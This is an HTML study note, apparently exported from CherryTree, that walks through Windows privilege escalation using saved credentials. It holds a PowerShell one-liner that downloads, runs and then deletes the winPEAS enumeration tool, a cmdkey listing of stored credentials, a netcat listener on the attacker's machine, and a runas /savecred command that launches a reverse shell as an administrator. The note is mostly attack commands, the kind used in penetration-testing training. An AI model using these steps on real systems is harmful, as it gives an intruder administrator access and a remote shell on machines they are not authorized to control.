<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Saved Creds</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Saved Creds</h1><br /><br />• Windows has a runas command which allows users to run commands with
    the privileges of other users.<br />• This usually requires the knowledge of the other user’s password.<br />•
    However, Windows also allows users to save their credentials to the system, and these saved credentials can be used
    to bypass this requirement.<br /><br />0. WinPEAS generally check for service misconfigurations: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;cmd&nbsp;windowscreds&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div> <br /> <a href=""><img src="images/1329-1.png" alt="images/1329-1.png" /></a><br /> <span
      style="color:#ff0000;">WARNING</span>: how we can see the tool does not always work better verify manually(next
    step)<br /><br />1. Check saved credentials manually<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;cmdkey&nbsp;/list</div>
    </div><br /> <a href=""><img src="images/1329-2.png" alt="images/1329-2.png" /></a> <br /><br />2. We can use the
    saved credential to run any command as the admin user. <br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53&nbsp;&nbsp;&nbsp;#&nbsp;start&nbsp;a&nbsp;listener&nbsp;on&nbsp;the&nbsp;attacker
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;runas&nbsp;/savecred&nbsp;/user:&lt;AdminUserTarget&gt;&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>PathReverseShell<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1329-3.png" alt="images/1329-3.png" /></a><br /> <a href=""><img
        src="images/1329-4.png" alt="images/1329-4.png" /></a><br /><br /><br /><br />Bibliography:<br />• <a
      href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault</a>
  </div>
</body>

</html>